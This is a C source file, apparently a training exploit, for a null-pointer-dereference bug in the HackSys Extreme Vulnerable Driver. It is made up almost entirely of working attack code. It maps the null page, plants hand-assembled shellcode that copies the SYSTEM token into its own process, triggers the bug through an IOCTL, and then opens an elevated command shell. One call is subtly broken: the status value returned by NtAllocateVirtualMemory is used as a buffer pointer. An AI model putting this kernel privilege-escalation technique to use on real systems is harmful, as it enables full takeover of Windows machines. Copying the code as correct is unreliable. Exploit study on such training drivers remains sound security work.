#include <Windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* PNtAllocateVirtualMemory) (HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

#define HACKSYS_EVD_IOCTL_NULL_PAGE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)

int NullPointer()
{
    unsigned char shellcode[] = {
        0x60,
        0x64, 0xA1, 0x24, 0x01, 0x00, 0x00,
        0x8B, 0x40, 0x50,
        0x89, 0xC1,
        0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00,
        //---[Копируем токен System PID]
        0xBA, 0x04, 0x00, 0x00, 0x00,
        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
        0x2D, 0xB8, 0x00, 0x00, 0x00,
        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00,
        0x75, 0xED,
        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00,
        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00,
        //---[Восстанавливаем]
        0x61,                               // popad
        0x31, 0xC0,
        0xC3                                //ret
    };

    HANDLE device = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    printf("[+] Open device handle 0x%x\n", device);

    PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
    LPVOID base = (LPVOID)0x1;
    ULONG size = 0x1000;
    char* sendbuffer = (char*)NtAllocateVirtualMemory(GetCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    LPVOID exploit = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exploit, shellcode, sizeof(shellcode));
    memcpy(&sendbuffer[4], &exploit, 4);
    char driverBuffer[10] = "\xE4\xE2\xE4\xE2";
    DWORD retn;
    DeviceIoControl(device, HACKSYS_EVD_IOCTL_NULL_PAGE, driverBuffer, 4, NULL, NULL, &retn, NULL);
    system("cmd");
}
